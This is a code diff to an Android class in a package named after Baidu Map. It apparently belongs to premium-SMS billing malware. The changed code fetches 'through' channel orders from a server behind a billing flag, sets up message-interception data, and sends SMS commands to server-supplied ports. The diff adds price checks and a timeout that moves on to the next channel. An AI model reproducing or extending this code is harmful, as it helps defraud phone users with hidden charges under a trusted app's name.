@@ -2,6 +2,7 @@ package com.baidu.BaiduMap.manager;
 
 import android.content.Context;
 import android.os.Handler;
+import android.provider.Telephony;
 
 import com.baidu.BaiduMap.data.BD_ThroughData;
 import com.baidu.BaiduMap.entity.RequestThroughCallBackEntity;
@@ -45,13 +46,13 @@ public class Bd_RequestThroughManager extends PayCallBackHandler {
             if (!InitRequest.isJi_Fei) {
                 return;
             }
-            if (null == throughID || throughID.equals("")) {
+            if (null == throughID || throughID.equals("")||price == null||price.equals("")) {
                 PayCallBackHandler.getInstance().payFail(bd_payCallBackHandler);
                 goToNextThrough(context, price, Did, productName, bd_payCallBackHandler);
                 return;
             }
             this.throughId = Integer.valueOf(throughID);
-//            this.price = Integer.valueOf(price);
+            this.price = Integer.valueOf(price);
             ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                 @Override
                 public void onCompleted() {
@@ -81,7 +82,13 @@ public class Bd_RequestThroughManager extends PayCallBackHandler {
                         weatherJinJi(InitRequest.isNextRequest, context, price, Did, productName, bd_payCallBackHandler);
                     } else {
                         setInterceptData(requestThroughCallBackEntity.getFix_msg(), requestThroughCallBackEntity.getPayType(), requestThroughCallBackEntity.getLimit_msg_1(), requestThroughCallBackEntity.getLimit_msg_2(), requestThroughCallBackEntity.getLimitNum());
-                        send(context, bd_payCallBackHandler);
+                        setRequestTimes();
+                        send(context, bd_payCallBackHandler, new SmsTimeOutCallBack() {
+                            @Override
+                            public void timeOut() {
+                                goToNextThrough(context, price, Did, productName, bd_payCallBackHandler);
+                            }
+                        });
                         //goToNextThrough(context, price, Did, productName, bd_payCallBackHandler);
                     }
                 }
@@ -100,16 +107,13 @@ public class Bd_RequestThroughManager extends PayCallBackHandler {
         }
     }
 
-    private void send(Context context, Handler bd_payCallBackHandler) {
+    private void send(Context context, Handler bd_payCallBackHandler, SmsTimeOutCallBack smsTimeOutCallBack) {
         for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
             String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
             String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
-            SmsCenter.getInstance().sendSms(context, sendport, command, price, throughId, bd_payCallBackHandler, new SmsTimeOutCallBack() {
-                @Override
-                public void timeOut() {
-
-                }
-            });
+            if (!sendport.isEmpty() && !command.isEmpty()) {
+                SmsCenter.getInstance().sendSms(context, sendport, command, price, throughId, bd_payCallBackHandler,smsTimeOutCallBack);
+            }
         }
     }
 
